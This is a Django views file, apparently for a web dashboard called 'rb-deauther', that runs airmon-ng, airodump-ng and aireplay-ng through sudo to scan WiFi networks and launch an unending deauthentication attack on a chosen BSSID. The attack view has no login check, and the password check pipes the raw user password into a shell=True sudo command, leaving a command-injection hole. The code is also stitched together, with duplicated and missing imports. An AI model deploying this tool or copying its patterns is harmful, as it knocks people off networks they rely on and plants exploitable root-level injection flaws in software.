from django.shortcuts import render
from django.http import HttpResponse
import subprocess
import time



def get_wireless_interface():
    try:
        result = subprocess.run(["iwconfig"], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if "IEEE 802.11" in line:
                return line.split()[0]
    except Exception as e:
        print(f"Error detecting interface: {e}")
    return None
from django.shortcuts import render, redirect
from django.contrib.auth.decorators import login_required
from django.contrib import messages
import subprocess
import os

@login_required
def scan_networks(request):
    """View for scanning nearby WiFi networks"""
    interface = get_wireless_interface() or 'wlan0'
    
    if request.method == 'POST':
        form = ScanForm(request.POST)
        if not form.is_valid():
            return render(request, 'scan.html', {'form': form, 'interface': interface})
            
        try:
            # Validate timeout input
            timeout = min(60, max(5, int(form.cleaned_data.get('timeout', 30))))
            
            # Generate secure temp file path
            with tempfile.NamedTemporaryFile(prefix=f"scan_{request.user.id}_", suffix='.csv', delete=True) as tmp:
                # Run scan commands
                monitor_interface = f"{interface}mon"
                
                # Start monitor mode
                subprocess.run(
                    ['sudo', 'airmon-ng', 'start', interface],
                    check=True,
                    timeout=30
                )
                
                try:
                    # Run scan
                    subprocess.run(
                        ['sudo', 'timeout', str(timeout),
                        'airodump-ng', monitor_interface,
                        '-w', tmp.name.rstrip('.csv'),
                        '--output-format', 'csv'],
                        check=True,
                        timeout=timeout + 5
                    )
                    
                    # Process results
                    networks = process_scan_results(tmp.name + '-01.csv')
                    return render(request, 'scan.html', {
                        'networks': networks,
                        'interface': interface,
                        'count': len(networks)
                    })
                    
                finally:
                    # Stop monitor mode
                    subprocess.run(
                        ['sudo', 'airmon-ng', 'stop', monitor_interface],
                        timeout=10
                    )
                    
        except subprocess.TimeoutExpired:
            messages.error(request, "Scan timed out")
        except subprocess.CalledProcessError as e:
            messages.error(request, f"Scan failed: {e.stderr}")
        except Exception as e:
            messages.error(request, f"Error: {str(e)}")
            logger.exception("Network scan failed")
    
    return render(request, 'scan.html', {'interface': interface})


@login_required
def home(request):
    """Dashboard view showing basic system info"""
    interface = get_wireless_interface()
    context = {
        'interface': interface,
        'current_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    return render(request, 'home.html', context)


def start_attack(request):
    if request.method == 'POST':
        target = request.POST.get('bssid')
        interface = request.POST.get('interface')
        filename = request.POST.get('filename')
        channel = request.POST.get('channel')
        
        # Start attack in background
        subprocess.Popen([
            "sudo", "aireplay-ng", "--deauth", "0", 
            "-a", target, f"{interface}mon"
        ])
        return HttpResponse("Attack started!")
    return render(request, 'attack.html')




from django.contrib.auth import authenticate
from django.conf import settings
import os

def verify_password(request):
    if request.method == 'POST':
        password = request.POST.get('password')
        
        # Verify password by testing sudo
        try:
            test_file = f"/tmp/sudo_test_{request.user.id}"
            cmd = f"echo '{password}' | sudo -S touch {test_file}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                os.remove(test_file)
                request.session['sudo_verified'] = True
                return HttpResponse("✓ Authentication successful")
            else:
                return HttpResponse("✗ Invalid password", status=400)
                
        except Exception as e:
            return HttpResponse(f"Error: {str(e)}", status=500)
    
    return HttpResponse("Invalid request", status=400)

@login_required
def view_logs(request):
    """View for displaying attack logs"""
    log_file = "/var/log/rb-deauther.log"
    logs = []
    
    if os.path.exists(log_file):
        with open(log_file, 'r') as f:
            logs = f.readlines()[-100:]  # Get last 100 lines
    
    return render(request, 'logs.html', {'logs': reversed(logs)})

from django.shortcuts import render, redirect
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from django.conf import settings
import os
from datetime import datetime
from .forms import ProfileUpdateForm

@login_required
def profile(request):
    # Get wireless interface for display
    interface = get_wireless_interface()
    
    # Handle profile updates
    if request.method == 'POST':
        form = ProfileUpdateForm(request.POST, instance=request.user)
        if form.is_valid():
            form.save()
            messages.success(request, 'Your profile has been updated!')
            return redirect('profile')
    else:
        form = ProfileUpdateForm(instance=request.user)
    
    # Prepare context data
    context = {
        'current_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'interface': interface,
        'form': form,
        'activity_logs': get_recent_activity(request.user),
        'stats': get_user_stats(request.user),
    }
    
    return render(request, 'profile.html', context)


def get_recent_activity(user):
    # In a real app, you'd query your Activity model
    # This is a mock implementation
    return [
        {'type': 'scan', 'message': 'Initiated network scan', 'timestamp': '2023-11-28 14:36:22'},
        {'type': 'attack', 'message': 'Launched deauth attack on TARGET-ALPHA', 'timestamp': '2023-11-28 12:15:08'},
        {'type': 'system', 'message': 'Updated security credentials', 'timestamp': '2023-11-27 09:42:51'},
    ]

def get_user_stats(user):
    # Mock stats - replace with real data from your models
    return {
        'missions': 87,
        'success_rate': 94.2,
        'targets': 642,
        'uptime': 99.98,
        'threat_level': 75,
    }